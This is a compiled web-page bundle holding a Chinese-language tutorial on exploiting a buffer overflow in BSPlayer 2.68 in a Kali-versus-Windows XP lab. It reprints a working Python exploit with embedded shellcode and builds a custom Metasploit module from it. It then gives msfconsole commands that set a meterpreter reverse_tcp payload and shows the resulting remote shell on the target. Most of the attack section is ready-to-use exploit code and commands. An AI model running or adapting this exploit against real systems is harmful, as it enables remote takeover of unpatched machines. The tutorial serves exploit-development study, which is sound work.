import{i as e,r as t,s as n,t as r}from"./app-CzMGd_v-.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-04-17-028-Metasploit%E6%B8%97%E9%80%8FBSPlayerV2.68.html","title":"Metasploit渗透BSPlayer V2.68","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"Metasploit渗透BSPlayer V2.68","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"Metasploit渗透BSPlayer V2.68","lock":"need"},"git":{"updatedTime":1777440209000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"},{"name":"Claude Sonnet 4.6","username":"","email":"noreply@anthropic.com","commits":1}],"changelog":[{"hash":"dfed50e61131b09c729d1e8ca8a6567f91a521cf","time":1777440209000,"email":"“1028386804@qq.com”","author":"binghe001","message":"Merge feature/upgrade-vuepress2: fix search box position and layout","coAuthors":[{"name":"Claude Sonnet 4.6","email":"noreply@anthropic.com"}]}]},"filePathRelative":"md/hack/tools/2022-04-17-028-Metasploit渗透BSPlayerV2.68.md"}`),a={name:`2022-04-17-028-Metasploit渗透BSPlayerV2.68.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="metasploit渗透bsplayer-v2-68" tabindex="-1"><a class="header-anchor" href="#metasploit渗透bsplayer-v2-68"><span>Metasploit渗透BSPlayer V2.68</span></a></h1><p>攻击机 Kali 192.168.109.137</p><p>靶机 WinXP 192.168.109.141</p><p>应用程序 BSPlayer V2.68 (可以到链接https://download.csdn.net/download/l1028386804/10923699下载BSPlayer V2.68 + 渗透脚本 )</p><h2 id="运行渗透脚本36477-py" tabindex="-1"><a class="header-anchor" href="#运行渗透脚本36477-py"><span>运行渗透脚本36477.py</span></a></h2><p>在靶机的命令行下切换到脚本36477.py所在的目录并输入如下命令：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">python 36477.py 127.0.0.1 81</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="https://img-blog.csdnimg.cn/20190117180920798.png" alt="img"></p><h2 id="安装并打开bsplayer" tabindex="-1"><a class="header-anchor" href="#安装并打开bsplayer"><span>安装并打开Bsplayer</span></a></h2><p>安装略。</p><p><img src="https://img-blog.csdnimg.cn/20190117180940577.png" alt="img"></p><p>此时，在Bsplayer中依次单击menu-&gt;打开 URL(U)... 载入要加载的链接，这里载入的链接为脚本36477.py监听的地址和端口,即：http://127.0.0.1:81，如下图：</p><p><img src="https://img-blog.csdnimg.cn/20190117181000232.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190117181008451.png" alt="img"></p><p>点击确定后，发现弹出了计算器窗口。</p><p><img src="https://img-blog.csdnimg.cn/20190117181025522.png" alt="img"></p><p>说明BSPlayer V2.68 存在溢出漏洞。</p><h2 id="分析36477-py脚本" tabindex="-1"><a class="header-anchor" href="#分析36477-py脚本"><span>分析36477.py脚本</span></a></h2><p>脚本具体内容如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">#!/usr/bin/python</span>
<span class="line"></span>
<span class="line">&#39;&#39;&#39; Bsplayer suffers from a buffer overflow vulnerability when processing the HTTP response when opening a URL.</span>
<span class="line">In order to exploit this bug I partially overwrited the seh record to land at pop pop ret instead of the full</span>
<span class="line">address and then used backward jumping to jump to a long jump that eventually land in my shellcode.</span>
<span class="line"></span>
<span class="line">Tested on : windows xp sp1 - windows 7 sp1 - Windows 8 Enterprise it might work in other versions as well just give it a try :)</span>
<span class="line"></span>
<span class="line">My twitter: @fady_osman</span>
<span class="line">My youtube: https://www.youtube.com/user/cutehack3r</span>
<span class="line">&#39;&#39;&#39;</span>
<span class="line"></span>
<span class="line">import socket</span>
<span class="line">import sys</span>
<span class="line">s = socket.socket()         # Create a socket object</span>
<span class="line">if(len(sys.argv) &lt; 3):</span>
<span class="line">  print &quot;[x] Please enter an IP and port to listen to.&quot;</span>
<span class="line">  print &quot;[x] &quot; + sys.argv[0] + &quot; ip port&quot;</span>
<span class="line">  exit()</span>
<span class="line">host = sys.argv[1]      # Ip to listen to.</span>
<span class="line">port = int(sys.argv[2])     # Reserve a port for your service.</span>
<span class="line">s.bind((host, port))        # Bind to the port</span>
<span class="line">print &quot;[*] Listening on port &quot; + str(port)</span>
<span class="line">s.listen(5)                 # Now wait for client connection.</span>
<span class="line">c, addr = s.accept()        # Establish connection with client.</span>
<span class="line"># Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.</span>
<span class="line">print((&#39;[*] Sending the payload first time&#39;, addr))</span>
<span class="line">c.recv(1024)</span>
<span class="line">#seh and nseh.</span>
<span class="line">buf =  &quot;&quot;</span>
<span class="line">buf += &quot;\\xbb\\xe4\\xf3\\xb8\\x70\\xda\\xc0\\xd9\\x74\\x24\\xf4\\x58\\x31&quot;</span>
<span class="line">buf += &quot;\\xc9\\xb1\\x33\\x31\\x58\\x12\\x83\\xc0\\x04\\x03\\xbc\\xfd\\x5a&quot;</span>
<span class="line">buf += &quot;\\x85\\xc0\\xea\\x12\\x66\\x38\\xeb\\x44\\xee\\xdd\\xda\\x56\\x94&quot;</span>
<span class="line">buf += &quot;\\x96\\x4f\\x67\\xde\\xfa\\x63\\x0c\\xb2\\xee\\xf0\\x60\\x1b\\x01&quot;</span>
<span class="line">buf += &quot;\\xb0\\xcf\\x7d\\x2c\\x41\\xfe\\x41\\xe2\\x81\\x60\\x3e\\xf8\\xd5&quot;</span>
<span class="line">buf += &quot;\\x42\\x7f\\x33\\x28\\x82\\xb8\\x29\\xc3\\xd6\\x11\\x26\\x76\\xc7&quot;</span>
<span class="line">buf += &quot;\\x16\\x7a\\x4b\\xe6\\xf8\\xf1\\xf3\\x90\\x7d\\xc5\\x80\\x2a\\x7f&quot;</span>
<span class="line">buf += &quot;\\x15\\x38\\x20\\x37\\x8d\\x32\\x6e\\xe8\\xac\\x97\\x6c\\xd4\\xe7&quot;</span>
<span class="line">buf += &quot;\\x9c\\x47\\xae\\xf6\\x74\\x96\\x4f\\xc9\\xb8\\x75\\x6e\\xe6\\x34&quot;</span>
<span class="line">buf += &quot;\\x87\\xb6\\xc0\\xa6\\xf2\\xcc\\x33\\x5a\\x05\\x17\\x4e\\x80\\x80&quot;</span>
<span class="line">buf += &quot;\\x8a\\xe8\\x43\\x32\\x6f\\x09\\x87\\xa5\\xe4\\x05\\x6c\\xa1\\xa3&quot;</span>
<span class="line">buf += &quot;\\x09\\x73\\x66\\xd8\\x35\\xf8\\x89\\x0f\\xbc\\xba\\xad\\x8b\\xe5&quot;</span>
<span class="line">buf += &quot;\\x19\\xcf\\x8a\\x43\\xcf\\xf0\\xcd\\x2b\\xb0\\x54\\x85\\xd9\\xa5&quot;</span>
<span class="line">buf += &quot;\\xef\\xc4\\xb7\\x38\\x7d\\x73\\xfe\\x3b\\x7d\\x7c\\x50\\x54\\x4c&quot;</span>
<span class="line">buf += &quot;\\xf7\\x3f\\x23\\x51\\xd2\\x04\\xdb\\x1b\\x7f\\x2c\\x74\\xc2\\x15&quot;</span>
<span class="line">buf += &quot;\\x6d\\x19\\xf5\\xc3\\xb1\\x24\\x76\\xe6\\x49\\xd3\\x66\\x83\\x4c&quot;</span>
<span class="line">buf += &quot;\\x9f\\x20\\x7f\\x3c\\xb0\\xc4\\x7f\\x93\\xb1\\xcc\\xe3\\x72\\x22&quot;</span>
<span class="line">buf += &quot;\\x8c\\xcd\\x11\\xc2\\x37\\x12&quot;</span>
<span class="line"></span>
<span class="line">jmplong = &quot;\\xe9\\x85\\xe9\\xff\\xff&quot;</span>
<span class="line">nseh = &quot;\\xeb\\xf9\\x90\\x90&quot;</span>
<span class="line"># Partially overwriting the seh record (nulls are ignored).</span>
<span class="line">seh = &quot;\\x3b\\x58\\x00\\x00&quot;</span>
<span class="line">buflen = len(buf)</span>
<span class="line">response = &quot;\\x90&quot; *2048 + buf + &quot;\\xcc&quot; * (6787 - 2048 - buflen) + jmplong + nseh + seh #+ &quot;\\xcc&quot; * 7000</span>
<span class="line">c.send(response)</span>
<span class="line">c.close()</span>
<span class="line">c, addr = s.accept()        # Establish connection with client.</span>
<span class="line"># Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.</span>
<span class="line">print((&#39;[*] Sending the payload second time&#39;, addr))</span>
<span class="line">c.recv(1024)</span>
<span class="line">c.send(response)</span>
<span class="line">c.close()</span>
<span class="line">s.close()</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>由此脚本我们可以得出几个重要的信息：</p><p><img src="https://img-blog.csdnimg.cn/20190117181117230.png" alt="img"></p><p>由此，我们就可以编写渗透模块了。</p><p><strong>注意：在当前场景中，需要目标计算机主动来连接我们的渗透服务器，而不是我们去连接目标服务器。因此我们的渗透服务器必须时刻对即将到来的连接处于监听状态。当收到目标请求之后，要向其发送恶意的内容。</strong></p><h2 id="创建metasploit渗透脚本bsplayer-attack-by-binghe-rb" tabindex="-1"><a class="header-anchor" href="#创建metasploit渗透脚本bsplayer-attack-by-binghe-rb"><span>创建Metasploit渗透脚本bsplayer_attack_by_binghe.rb</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">##</span>
<span class="line"># Author 冰河</span>
<span class="line"># Date 2019-01-17</span>
<span class="line"># Description Metasploit渗透 Bsplayer V2.68</span>
<span class="line">#</span>
<span class="line"># 在当前场景中，需要目标计算机主动来连接我们的渗透服务器，而不是我们去连接目标服务器。</span>
<span class="line"># 因此我们的渗透服务器必须时刻对即将到来的连接处于监听状态。当收到目标请求之后，要向</span>
<span class="line"># 其发送恶意的内容。</span>
<span class="line">##</span>
<span class="line"></span>
<span class="line">require &#39;msf/core&#39;</span>
<span class="line"></span>
<span class="line">class Metasploit3 &lt; Msf::Exploit::Remote</span>
<span class="line">  Rank = NormalRanking</span>
<span class="line">  </span>
<span class="line">  include Msf::Exploit::Remote::TcpServer</span>
<span class="line">  </span>
<span class="line">  def initialize(info = {})</span>
<span class="line">    super(update_info(info,</span>
<span class="line">      &#39;Name&#39;              =&gt; &quot;BsPlayer 2.68 SEH Overflow Exploit&quot;,</span>
<span class="line">      &#39;Description&#39;       =&gt; %q{</span>
<span class="line">          Here&#39;s an example of server Based Exploit</span>
<span class="line">      },</span>
<span class="line">      &#39;Author&#39;            =&gt; [&#39;binghe&#39;],</span>
<span class="line">      &#39;Platform&#39;          =&gt; &#39;Windows&#39;,</span>
<span class="line">      &#39;Targets&#39;           =&gt; </span>
<span class="line">        [</span>
<span class="line">          [&#39;Generic&#39;, {&#39;Ret&#39;  =&gt; 0x0000583b, &#39;Offset&#39; =&gt; 2048}],</span>
<span class="line">        ],</span>
<span class="line">      &#39;Payload&#39;           =&gt;</span>
<span class="line">        {</span>
<span class="line">          &#39;BadChars&#39;      =&gt; &quot;\\x00\\x0a\\x20\\x0d&quot;</span>
<span class="line">        },</span>
<span class="line">      &#39;DisclosureDate&#39;    =&gt; &quot;2017-01-17&quot;,</span>
<span class="line">      &#39;DefaultTarget&#39;     =&gt; 0))</span>
<span class="line">   end</span>
<span class="line">   </span>
<span class="line">  def on_client_connect(client)</span>
<span class="line">    return if((p = regenerate_payload(client)) == nil)</span>
<span class="line">    print_status(&quot;Client Connected&quot;)</span>
<span class="line">    sploit = make_nops(target[&#39;Offset&#39;])</span>
<span class="line">    sploit &lt;&lt; payload.encoded</span>
<span class="line">    sploit &lt;&lt; &quot;\\xcc&quot; * (6787 - 2048 - payload.encoded.length)</span>
<span class="line">    sploit &lt;&lt; &quot;\\xe9\\x85\\xe9\\xff\\xff&quot;</span>
<span class="line">    sploit &lt;&lt; &quot;\\xeb\\xf9\\x90\\x90&quot;</span>
<span class="line">    sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)</span>
<span class="line">    client.put(sploit)</span>
<span class="line">    client.get_once</span>
<span class="line">    client.put(sploit)</span>
<span class="line">    handler(client)</span>
<span class="line">    service.close_client(client)</span>
<span class="line">  end</span>
<span class="line">end</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="上传渗透脚本bsplayer-attack-by-binghe-rb" tabindex="-1"><a class="header-anchor" href="#上传渗透脚本bsplayer-attack-by-binghe-rb"><span>上传渗透脚本bsplayer_attack_by_binghe.rb</span></a></h2><p>将渗透脚本bsplayer_attack_by_binghe.rb上传到Kali的/usr/share/metasploit-framework/modules/exploits/windows/masteringmetasploit目录下</p><h2 id="运行渗透脚本bsplayer-attack-by-binghe-rb" tabindex="-1"><a class="header-anchor" href="#运行渗透脚本bsplayer-attack-by-binghe-rb"><span>运行渗透脚本bsplayer_attack_by_binghe.rb</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msfconsole</span>
<span class="line">use exploit/windows/masteringmetasploit/bsplayer_attack_by_binghe </span>
<span class="line">set SRVHOST 192.168.109.137</span>
<span class="line">set SRVPORT 8080</span>
<span class="line">set payload windows/meterpreter/reverse_tcp</span>
<span class="line">set LHOST 192.168.109.137</span>
<span class="line">set LPORT 8888</span>
<span class="line">show options</span>
<span class="line">exploit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>具体操作效果如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msf &gt; use exploit/windows/masteringmetasploit/bsplayer_attack_by_binghe </span>
<span class="line">msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) &gt; set SRVHOST 192.168.109.137</span>
<span class="line">SRVHOST =&gt; 192.168.109.137</span>
<span class="line">msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) &gt; set SRVPORT 8080</span>
<span class="line">SRVPORT =&gt; 8080</span>
<span class="line">msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) &gt; set payload windows/meterpreter/reverse_tcp</span>
<span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span>
<span class="line">msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) &gt; set LHOST 192.168.109.137</span>
<span class="line">LHOST =&gt; 192.168.109.137</span>
<span class="line">msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) &gt; set LPORT 8888</span>
<span class="line">LPORT =&gt; 8888</span>
<span class="line">msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) &gt; show options</span>
<span class="line"></span>
<span class="line">Module options (exploit/windows/masteringmetasploit/bsplayer_attack_by_binghe):</span>
<span class="line"></span>
<span class="line">   Name     Current Setting  Required  Description</span>
<span class="line">   ----     ---------------  --------  -----------</span>
<span class="line">   SRVHOST  192.168.109.137  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span>
<span class="line">   SRVPORT  8080             yes       The local port to listen on.</span>
<span class="line">   SSL      false            no        Negotiate SSL for incoming connections</span>
<span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options (windows/meterpreter/reverse_tcp):</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span>
<span class="line">   LHOST     192.168.109.137  yes       The listen address (an interface may be specified)</span>
<span class="line">   LPORT     8888             yes       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   0   Generic</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) &gt; exploit</span>
<span class="line">[*] Exploit running as background job 0.</span>
<span class="line"></span>
<span class="line">[*] Started reverse TCP handler on 192.168.109.137:8888 </span>
<span class="line">msf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) &gt; [*] Started service listener on 192.168.109.137:8080 </span>
<span class="line">[*] Server started.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="打开bsplay并设置打开的url" tabindex="-1"><a class="header-anchor" href="#打开bsplay并设置打开的url"><span>打开Bsplay并设置打开的URL</span></a></h2><p>打开Bsplay并将URL设置为http://192.168.109.137:8080,点击确定按钮</p><p><img src="https://img-blog.csdnimg.cn/20190117181414585.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190117181421865.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/2019011718143024.png" alt="img"></p><h2 id="查看kali终端结果" tabindex="-1"><a class="header-anchor" href="#查看kali终端结果"><span>查看Kali终端结果</span></a></h2><p>此时，我们切换到Kali下查看结果，输出如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">[*] Client Connected</span>
<span class="line">[*] Client Connected</span>
<span class="line">[*] Sending stage (179779 bytes) to 192.168.109.141</span>
<span class="line">meterpreter &gt; ifconfig</span>
<span class="line"></span>
<span class="line">Interface  1</span>
<span class="line">============</span>
<span class="line">Name         : MS TCP Loopback interface</span>
<span class="line">Hardware MAC : 00:00:00:00:00:00</span>
<span class="line">MTU          : 1520</span>
<span class="line">IPv4 Address : 127.0.0.1</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Interface 65539</span>
<span class="line">============</span>
<span class="line">Name         : VMware Accelerated AMD PCNet Adapter</span>
<span class="line">Hardware MAC : 00:0c:29:5d:8e:d4</span>
<span class="line">MTU          : 1500</span>
<span class="line">IPv4 Address : 192.168.109.141</span>
<span class="line">IPv4 Netmask : 255.255.255.0</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Interface 65540</span>
<span class="line">============</span>
<span class="line">Name         : Bluetooth �s</span>
<span class="line">Hardware MAC : 3c:a0:67:1a:fe:b4</span>
<span class="line">MTU          : 1500</span>
<span class="line"></span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>此时，我们通过BSPlayer的漏洞拿下了目标主机的Materpreter Shell。</p><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,44)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};